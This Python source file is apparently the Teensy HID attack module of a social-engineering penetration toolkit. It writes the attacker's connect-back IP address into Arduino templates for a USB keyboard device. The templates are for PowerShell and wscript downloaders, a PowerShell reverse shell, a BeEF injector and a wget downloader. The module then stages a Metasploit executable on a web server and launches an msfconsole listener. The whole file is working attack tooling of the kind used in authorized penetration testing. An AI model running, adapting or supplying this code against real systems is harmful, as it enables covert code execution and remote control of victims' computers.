#!/usr/bin/env python
############################
#
# Teensy HID Attack Vector
#
############################
import sys
import re
import os
import subprocess
import datetime
from src.core.setcore import *

# pull metasploit path
msf_path=meta_path()

# check operating system
operating_system = check_os()
now=datetime.datetime.today()
if operating_system != "windows": import pexpect

# check to see if setdir is created
if not os.path.isdir(setdir + "/reports/"):
    os.makedirs(setdir + "/reports/")

definepath=os.getcwd()
# define if use apache or not
apache=0
# open set_config here
apache_check=file("/etc/setoolkit/set.config", "r").readlines()
# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
    # strip \r\n
    line=line.rstrip()
    # if apache is turned on get things ready
    match=re.search("APACHE_SERVER=ON",line)
    # if its on lets get apache ready
    if match:
        for line2 in apache_check:
            # set the apache path here
            match2=re.search("APACHE_DIRECTORY=", line2)
            if match2:
                line2=line2.rstrip()
                apache_path=line2.replace("APACHE_DIRECTORY=","")
                apache=1


# grab info from config file
fileopen=file(setdir + "/teensy", "r")
counter=0
payload_counter=0
for line in fileopen:
    line=line.rstrip()
    if counter == 0:
        choice=str(line)
    if counter == 1:
        payload_counter=1
    counter=counter+1

if choice != "14":
    # Open the IPADDR file
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr=raw_input(setprompt(["6"], "IP address to connect back on"))
        update_options("IPADDR=" + ipaddr)

if not os.path.isfile(setdir + "/teensy"):
    print_error("FATAL:Something went wrong, the Teensy config file was not created.")
    exit_set()


def writefile(filename,now):
    fileopen=file("src/teensy/%s" % filename, "r")
    filewrite=file(setdir + "/reports/teensy_%s.pde" % (now), "w")
    for line in fileopen:
        match=re.search("IPADDR",line)
        if match:
            line=line.replace("IPADDR", ipaddr)
        match = re.search("12,12,12,12", line)
        if match:
            ipaddr_replace = ipaddr.replace(".", ",", 4)
            line = line.replace("12,12,12,12", ipaddr_replace)

        filewrite.write(line)
    filewrite.close()

# powershell downloader
if choice == "1":
    writefile("powershell_down.pde", now)

# wscript downloader
if choice == "2":
    writefile("wscript.pde",now)

# powershell reverse
if choice == "3":
    writefile("powershell_reverse.pde",now)

# beef injector
if choice == "4":
    writefile("beef.pde",now)

# java applet downloader
if choice == "5":
    writefile("java_applet.pde",now)

# gnome wget downloader
if choice == "6":
    writefile("gnome_wget.pde",now)

if choice == "13":
    writefile("peensy.pde",now)
    payload_counter = 0

# save our stuff here
print bcolors.BLUE + "\n[*] PDE file created. You can get it under '%s/reports/teensy_%s.pde' " % (setdir,now) +bcolors.ENDC
print bcolors.GREEN + '[*] Be sure to select "Tools", "Board", and "Teensy 2.0 (USB/KEYBOARD)" in Arduino' + bcolors.ENDC
print bcolors.RED + "\n[*] If your running into issues with VMWare Fusion and the start menu, uncheck\nthe 'Enable Key Mapping' under preferences in VMWare" + bcolors.ENDC

pause = raw_input("Press {return} to continue.")

if payload_counter == 1:
    if apache == 0:
        subprocess.Popen("mkdir %s/web_clone/;cp %s/msf.exe %s/web_clone/x.exe 1> /dev/null 2> /dev/null" % (setdir,setdir,setdir), shell=True).wait()
        if operating_system != "windows":
            child=pexpect.spawn("python src/html/web_server.py")

    if apache == 1:
        subprocess.Popen("cp %s/msf.exe %s/x.exe" % (setdir,apache_path), shell=True).wait()
    if os.path.isfile(setdir + "/meta_config"):
        print bcolors.BLUE + "\n[*] Launching MSF Listener..."
        print bcolors.BLUE + "[*] This may take a few to load MSF..." + bcolors.ENDC
        try:
            if operating_system != "windows":
                child1=pexpect.spawn("%smsfconsole -r %s/meta_config\r\n\r\n" % (msf_path,setdir))
                child1.interact()
        except:
            if operating_system != "windows":
                if apache == 0:
                    child.close()
                child1.close()
